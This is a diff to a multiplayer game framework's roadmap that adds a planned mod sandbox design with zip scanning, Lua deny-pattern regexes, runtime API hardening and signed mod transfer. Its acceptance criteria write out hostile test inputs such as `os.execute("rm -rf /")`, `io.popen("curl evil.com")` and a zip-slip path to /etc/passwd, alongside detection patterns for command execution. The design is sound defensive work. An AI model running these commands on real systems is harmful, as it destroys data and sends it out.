@@ -3,7 +3,7 @@
 > **Last updated:** 2026-04-03
 > **Versioning scheme:** [Semantic Versioning 2.0.0](https://semver.org/)
 > **Current version:** v0.8.0-dev.4 (protocol v2)
-> **Status:** v0.8.0-dev.4 — Community Node Discovery Mesh + Connection Flow Cleanup
+> **Status:** v0.8.0-dev.4 — Community Node Discovery Mesh + Connection Flow Cleanup | v0.9.0 planned
 
 ---
 
@@ -822,12 +822,289 @@ Every community node:
 
 ---
 
+### v0.9.0 — Mod Sandbox & Code Integrity (Beta)
+
+**Status:** Planned
+**Goal:** Production-ready sandbox system for all mods on servers and clients, preventing malicious code injection/execution through mod files while preserving full BeamNG modding capability.
+
+**Problem Statement:**
+
+HighBeam currently has no content-level inspection of mod files. The existing security posture:
+
+| Layer | Current Protection | Gap |
+|---|---|---|
+| **Server plugins** | Lua stdlib whitelist (TABLE/STRING/MATH/UTF8/COROUTINE), FS scoped to plugin dir, no network | `HB.FS.WriteFile` has no size limit or file type restriction. `eval_in_plugin` allows arbitrary code injection from console. |
+| **Client mods (from server)** | SHA-256 hash verification, `.zip` extension filter, path traversal check on names | No inspection of zip contents — a zip can contain arbitrary Lua that runs with full BeamNG GE API access (LuaSocket networking, IMGUI, vehicle spawning, game state manipulation) |
+| **Launcher install** | Verifies `scripts/modScript.lua` and `lua/ge/extensions/highbeam.lua` exist in zip | Only checks for file existence, not content. A mod could include any additional files with malicious code |
+| **Mod transfer** | Plaintext TCP (TLS optional), 1MB control packet limit, 256 mod name limit | No mod signing — MITM can replace mod content if TLS is disabled. Server operator is fully trusted |
+
+**Threat Model:**
+
+A malicious server operator (or compromised server) pushes a mod zip containing Lua code that:
+- Reads/exfiltrates local files via `io.open` or `FS` APIs
+- Opens network connections via `require("socket")` to exfiltrate data or act as a bot
+- Executes system commands if `os.execute` is accessible
+- Installs persistent payloads that survive mod cleanup (writing to paths outside the mod sandbox)
+- Crashes or corrupts the game state for griefing
+
+Secondary threat: MITM during mod transfer injects modified zip contents (mitigated when TLS is enabled, but not enforced).
+
+**Design Principles:**
+1. **Defense in depth** — Multiple independent layers, each sufficient to block a class of attack
+2. **Whitelist over blacklist** — Allow known-safe patterns rather than trying to block every dangerous one
+3. **Preserve modding capability** — BeamNG mods legitimately need vehicle definitions, map data, UI assets, meshes, textures, and Lua game extensions. The sandbox must not break normal mods
+4. **Server operator trust boundary** — Players trust OUR code (highbeam.zip), but should NOT have to trust arbitrary server operators who push mods
+5. **Transparent to mod authors** — Legitimate mods should work without modification. Only malicious patterns are blocked
+
+**Architecture Overview:**
+
+The sandbox operates at five layers:
+
+```
+Layer 1: ZIP Content Scanning (Launcher — pre-install)
+    ↓
+Layer 2: Lua Static Analysis (Launcher — pre-install)
+    ↓
+Layer 3: Runtime Lua Environment Hardening (Client — BeamNG GE)
+    ↓
+Layer 4: Server Plugin Hardening (Server — mlua)
+    ↓
+Layer 5: Mod Transfer Integrity (Launcher ↔ Server)
+```
+
+Each layer catches threats the previous one might miss. Layers 1-2 run in the launcher before any code is installed. Layer 3 runs in-game as a runtime safety net. Layer 4 hardens the already-sandboxed server plugin environment. Layer 5 ensures transfer-time integrity.
+
+---
+
+**Layer 1: ZIP Content Scanning (Launcher)**
+
+New file: `launcher/src/mod_sandbox.rs`
+Called from: `installer.rs` — after download, before install into BeamNG mods dir.
+
+| Check | Rule | Rationale |
+|---|---|---|
+| **Path traversal** | Reject entries with `..`, absolute paths, or paths starting with `/` or `\` | Prevent zip slip (writing outside mods dir) |
+| **Symlink entries** | Reject any zip entry that is a symlink | Symlinks can escape the mod directory at extraction time |
+| **Filename sanitization** | Reject entries with null bytes, control chars, or OS-reserved names (`CON`, `NUL`, `AUX`, etc. on Windows) | Prevent OS-level exploits |
+| **Max entry count** | Reject zips with >10,000 entries | Prevent zip bomb / memory exhaustion during scan |
+| **Max total uncompressed size** | Reject if total uncompressed size exceeds 2 GB | Prevent disk-fill zip bombs |
+| **Compression ratio** | Reject individual entries with >100:1 compression ratio | Detect nested zip bombs |
+| **Allowed file extensions** | Whitelist: `.lua`, `.json`, `.html`, `.css`, `.js`, `.png`, `.jpg`, `.jpeg`, `.dds`, `.ogg`, `.wav`, `.mp3`, `.dae`, `.jbeam`, `.pc`, `.materials.json`, `.cs`, `.mis`, `.ter`, `.prefab`, `.forest`, `.decals`, `.zip` (nested mod zips allowed but NOT recursively extracted), and extensionless files | Blocks `.exe`, `.dll`, `.so`, `.sh`, `.bat`, `.cmd`, `.ps1`, `.py`, `.rb`, etc. |
+| **Double extension** | Reject files with executable-like double extensions (e.g., `model.lua.exe`) | Bypass attempt via double extension |
+
+Behavior on failure: block installation, log specific violation, report to user via launcher UI/IPC. The mod is NOT installed. Cache entry is removed.
+
+**Implementation:**
+- `pub struct ScanResult { passed: bool, violations: Vec<ScanViolation> }`
+- `pub struct ScanViolation { entry_name: String, rule: &'static str, detail: String }`
+- `pub fn scan_mod_zip(path: &Path) -> Result<ScanResult>`
+- Integration in `installer.rs::install_all()`: scan before copy, bail on violation
+
+---
+
+**Layer 2: Lua Static Analysis (Launcher)**
+
+New file: `launcher/src/lua_scan.rs`
+Called from: `mod_sandbox.rs` — for every `.lua` file found in the zip.
+
+Pattern-based static analysis pass (regex, not full Lua parser). Scans Lua source for dangerous API usage patterns.
+
+*Blocked Patterns (Hard Deny):*
+
+| Pattern | Threat | Regex |
+|---|---|---|
+| `os.execute` | Arbitrary command execution | `\bos\s*\.\s*execute\b` |
+| `os.remove` | File deletion outside sandbox | `\bos\s*\.\s*remove\b` |
+| `os.rename` | File manipulation outside sandbox | `\bos\s*\.\s*rename\b` |
+| `os.getenv` | Environment variable leakage | `\bos\s*\.\s*getenv\b` |
+| `os.tmpname` | Temp file creation | `\bos\s*\.\s*tmpname\b` |
+| `io.popen` | Command execution via pipe | `\bio\s*\.\s*popen\b` |
+| `io.open` with write modes | Arbitrary file write | `\bio\s*\.\s*open\s*\(` (flagged, checked for write mode `w`, `a`, `w+`, `a+` in context) |
+| `io.lines` on absolute paths | Reading arbitrary files | `\bio\s*\.\s*lines\s*\(` (flagged if arg starts with `/` or drive letter) |
+| `loadstring` / `load` with string | Dynamic code execution from string | `\bloadstring\s*\(` or `\bload\s*\(\s*["']` |
+| `dofile` / `loadfile` on absolute paths | Loading code from outside mod | `\bdofile\s*\(` / `\bloadfile\s*\(` (flagged if arg is absolute) |
+| `debug.*` | Debug library introspection/manipulation | `\bdebug\s*\.\s*\w+` |
+| `rawset(_G, ...)` on protected names | Global namespace pollution | `\brawset\s*\(\s*_G` |
+| `ffi.cdef` / `ffi.C` / `ffi.load` | FFI foreign function calls | `\bffi\s*\.\s*(cdef\|C\|load\|new\|cast\|typeof\|metatype)\b` |
+| `package.loadlib` | Loading native libraries | `\bpackage\s*\.\s*loadlib\b` |
+| `package.searchpath` with absolute | Path probing | `\bpackage\s*\.\s*searchpath\b` (flagged if first arg is absolute) |
+
+*Flagged Patterns (Warning, not blocking):*
+
+| Pattern | Reason |
+|---|---|
+| `require("socket")` / `require("socket.http")` | Networking — legitimate for multiplayer mods but suspicious in server-pushed mods |
+| `io.open` with read mode | File reading — legitimate for config loading but flagged for operator review |
+| `collectgarbage` | GC manipulation — can degrade performance |
+
+*Obfuscation Detection:*
+- Flag files with >50% non-ASCII characters (minified/obfuscated Lua)
+- Flag files containing long hex-encoded strings (>500 chars of `\xNN` sequences)
+- Flag excessive use of `string.char` / `string.byte` chains (>10 in a single file) — commonly used to construct blocked function names at runtime
+
+**Implementation approach:**
+- Extract each `.lua` file from zip into memory (do NOT write to disk)
+- Strip Lua comments (`--` line comments, `--[[ ]]` block comments) before scanning
+- Apply regex patterns against the stripped source
+- Hard-deny patterns block installation; flagged patterns generate warnings in the scan report
+
+---
+
+**Layer 3: Runtime Lua Environment Hardening (Client)**
+
+New file: `client/lua/ge/extensions/highbeam/sandbox.lua`
+Called from: `highbeam.lua` `onExtensionLoaded()` — runs ONCE at startup, before any server mods load.
+
+Even if a malicious mod passes static analysis, runtime environment hardening prevents dangerous operations.
+
+*Strategy:* BeamNG GE extensions run in a shared Lua state. We cannot fully isolate server mods. Instead, we neuter dangerous global APIs before server mods load, and hook mod loading to apply restrictions.
+
+*API Restrictions Applied:*
+
+| API | Action | Rationale |
+|---|---|---|
+| `os.execute`, `os.remove`, `os.rename`, `os.getenv`, `os.tmpname`, `os.exit` | Replaced with no-op stubs that log warnings | Block system command execution, file manipulation, env leakage |
+| `os.clock`, `os.time`, `os.date`, `os.difftime` | Preserved | Safe time functions needed by legitimate mods |
+| `io.popen` | Replaced with no-op stub | Block command execution via pipe |
+| `io.open` (write modes) | Blocked — returns nil + "permission denied" | Prevent arbitrary file writes |
+| `io.open` (read mode) | Allowed | Mods legitimately read their own configs, vehicle data, etc. |
+| `debug` library | Fully removed from global scope and `package.loaded` | No legitimate mod needs it; enables sandbox escape via `debug.getfenv`/`debug.setfenv`/`debug.sethook` |
+| `ffi.cdef`, `ffi.C`, `ffi.load`, `ffi.new`, `ffi.cast`, `ffi.metatype` | Blocked via metatable proxy | Block native code execution. `ffi.sizeof`, `ffi.typeof`, `ffi.istype`, `ffi.string` preserved (safe read-only FFI operations BeamNG uses internally) |
+| `loadstring` | Replaced with no-op returning nil | Block dynamic code execution from strings |
+| `load(string)` | Blocked | Block string-based code loading. `load(function)` preserved (BeamNG uses for chunk-based module loading) |
+| `package.loadlib` | Replaced with no-op | Block native library loading |
+
+*Design Decisions:*
+- Sandbox is applied in `onExtensionLoaded()` AFTER BeamNG core initialization completes, to avoid interfering with engine internals
+- Originals are stored in a private table so HighBeam's own code can use them if needed (via `sandbox._getOriginal(name)`)
+- If a specific BeamNG system breaks, that specific call is whitelisted with a comment explaining why
+
+*Tamper Resistance:*
+- Protected globals are defended against `rawset(_G, ...)` restoration attempts
+- Layer 2 static analysis catches `rawset(_G, ...)` patterns before code ever runs, providing defense in depth
+
+---
+
+**Layer 4: Server Plugin Hardening (Server)**
+
+Files: `server/src/plugin/runtime.rs`, `server/src/plugin/api.rs`, `server/src/config.rs`
+
+| Change | Detail |
+|---|---|
+| **FS write size limit** | `HB.FS.WriteFile` capped at 10 MB per call. Prevents a plugin from filling disk. |
+| **FS total storage quota** | Per-plugin storage quota of 100 MB. Track cumulative writes in `PluginInstance` state. |
+| **FS file count limit** | Max 1,000 files per plugin directory. |
+| **Read file size limit** | `HB.FS.ReadFile` capped at 50 MB to prevent memory exhaustion. |
+| **Disable `eval_in_plugin` in production** | `AllowPluginEval = false` (default) disables `lua <plugin> <code>` console command. Returns "Plugin eval disabled — set AllowPluginEval=true in ServerConfig.toml to enable." |
+| **Plugin source hash logging** | On load, log SHA-256 of each plugin's `main.lua` for audit trail. |
+| **Event payload size limit** | `TriggerClientEvent` / `BroadcastClientEvent` payload capped at 64 KB. Prevents plugins from pushing huge payloads to clients. |
+
+---
+
+**Layer 5: Mod Transfer Integrity (Launcher ↔ Server)**
+
+Files: `launcher/src/mod_sync.rs`, `server/src/net/mod_transfer.rs`, `launcher/src/config.rs`, `server/src/config.rs`
+
+| Change | Detail |
+|---|---|
+| **Enforce TLS for mod transfer** | New launcher config: `RequireTlsForMods = true` (default). Launcher refuses to download mods over plaintext TCP. Prevents MITM mod injection. |
+| **Mod manifest signing** | Server signs the mod manifest with an Ed25519 key. Launcher verifies signature before accepting mod data. |
+| **Max individual mod size** | 500 MB per-mod limit on both server (refuse to serve) and launcher (refuse to download). |
+| **Download timeout** | Per-mod download timeout of 10 minutes (configurable). |
+
+*Manifest Signing Detail:*
+- Server generates an Ed25519 keypair on first startup, stores in `server_mod_key.pem`
+- Public key sent in `ServerHello` packet (new field: `mod_signing_key`)
+- Launcher stores seen keys per server address in `~/.highbeam/known_servers.json` (TOFU model, like SSH)
+- On mod sync, server sends signed manifest: `{mods: [...], signature: "base64..."}`
+- Launcher verifies signature against stored/TOFU key
+- If key changes, launcher warns: "Server mod signing key changed — this could indicate a security issue. Continue? [y/N]"
+
+---
+
+**Configuration Additions:**
+
+*ServerConfig.toml:*
+```toml
+[Security]
+# Allow running arbitrary Lua in plugin states from server console
+AllowPluginEval = false
+# Per-plugin storage quota in megabytes
+PluginStorageQuotaMB = 100
+# Maximum single plugin file size in megabytes
+PluginMaxFileSizeMB = 10
+# Maximum event payload size in kilobytes
+MaxEventPayloadKB = 64
+```
+
+*LauncherConfig.toml:*
+```toml
+[Security]
+# Require TLS for mod downloads (recommended)
+RequireTlsForMods = true
+# Maximum mod file size in megabytes (per mod)
+MaxModSizeMB = 500
+# Per-mod download timeout in seconds
+ModDownloadTimeoutSec = 600
+# Trust-on-first-use for server mod signing keys
+ModSigningTrust = "tofu"  # "tofu", "pinned", or "none"
+```
+
+---
+
+**Implementation Phases:**
+- [ ] **Phase A (ZIP Content Scanning):** `launcher/src/mod_sandbox.rs` — zip structure validation (path traversal, symlinks, file types, size limits, compression ratio). Integration into `installer.rs::install_all()`. Unit tests with crafted malicious zips.
+- [ ] **Phase B (Lua Static Analysis):** `launcher/src/lua_scan.rs` — regex-based pattern scanner for dangerous Lua APIs. Obfuscation detection heuristics. Integration into `mod_sandbox.rs::scan_mod_zip()`. Unit tests with sample malicious Lua snippets.
+- [ ] **Phase C (Client Runtime Sandbox):** `client/lua/ge/extensions/highbeam/sandbox.lua` — API neutering (os, io, debug, ffi, loadstring, package.loadlib). Integration into `highbeam.lua::onExtensionLoaded()`. Manual testing matrix for common BeamNG mod patterns. Regression testing for HighBeam subsystems.
+- [ ] **Phase D (Server Plugin Hardening):** FS write/read limits, storage quota, file count limit. Event payload size cap. `AllowPluginEval` config toggle. Plugin source hash audit logging. Unit tests for quota enforcement.
+- [ ] **Phase E (Transfer Integrity):** Ed25519 keypair generation and storage on server. Manifest signing in `mod_transfer.rs`. Signature verification in `mod_sync.rs`. TOFU key store in launcher. `RequireTlsForMods` enforcement. Max mod size / download timeout limits.
+- [ ] **Phase F (Integration Testing):** End-to-end: server with malicious test mod → launcher blocks it. End-to-end: server with legitimate BeamNG mod → launcher installs normally. Runtime sandbox verified with HighBeam connection flow. Plugin hardening verified with existing test plugins. MITM simulation test (mod transfer without TLS blocked).
+
+---
+
+**Explicit Scope Boundaries (Out of Scope):**
+
+| Out of Scope | Reason |
+|---|---|
+| **Sandboxing HighBeam's own client mod** | First-party trusted code. The sandbox protects against THIRD-PARTY server-pushed mods. |
+| **Full Lua AST parsing** | Diminishing returns vs. complexity. Static regex + runtime hardening covers the threat model. |
+| **Process-level isolation** | BeamNG mods run in the game process. Cannot spawn separate processes without engine modifications. |
+| **Anti-cheat** | Vehicle manipulation, speed hacking, etc. are gameplay integrity issues, not security sandbox issues. Separate concern. |
+| **Mod content moderation** | Offensive textures, copyrighted assets, etc. are policy issues, not security. |
+
+---
+
+**Acceptance Criteria:**
+- [ ] Zip containing `../../etc/passwd` entry path is rejected at scan time
+- [ ] Zip containing `malware.exe` is rejected at scan time
+- [ ] Zip with >100:1 compression ratio on any entry is rejected
+- [ ] Lua file containing `os.execute("rm -rf /")` is rejected at scan time
+- [ ] Lua file containing `io.popen("curl evil.com")` is rejected at scan time
+- [ ] Lua file with obfuscated `loadstring(string.char(111,115))` chain is flagged
+- [ ] At runtime, `os.execute` from a server mod returns nil (sandbox blocks it)
+- [ ] At runtime, `io.open("/etc/passwd", "r")` succeeds (read allowed) but `io.open("/tmp/payload", "w")` returns nil (write blocked)
+- [ ] At runtime, `debug` global is nil
+- [ ] At runtime, `ffi.cdef` / `ffi.C` / `ffi.load` return nil / error
+- [ ] At runtime, `loadstring("print('hi')")` returns nil
+- [ ] Server plugin `HB.FS.WriteFile` with >10MB content is rejected
+- [ ] Server plugin exceeding 100MB total storage is rejected
+- [ ] `TriggerClientEvent` with >64KB payload is rejected
+- [ ] `lua <plugin> <code>` console command is disabled by default
+- [ ] Mod transfer without TLS is refused when `RequireTlsForMods = true`
+- [ ] Mod manifest signature verification succeeds for legitimate server
+- [ ] Mod manifest signature verification fails for tampered manifest
+- [ ] All existing BeamNG mod types (vehicle, map, UI) still install and work normally
+- [ ] HighBeam's own connection/chat/vehicle/browser subsystems work with sandbox active
+
+---
+
 ### v1.0.0 — Stable Release
 
 **Goal:** Feature-complete, documented, stable multiplayer framework.
 
 **Requirements for 1.0.0:**
-- All v0.x features stable and tested (v0.1–v0.5 minimum required; v0.6+ optional)
+- All v0.x features stable and tested (v0.1–v0.5 minimum required; v0.6–v0.9 recommended)
+- Mod sandbox system operational and tested (v0.9.0)
 - Protocol version finalized (breaking changes require major version bump after this)
 - Plugin API stable (HB.* namespace frozen)
 - Security audit: all input validation, rate limiting, and auth paths reviewed
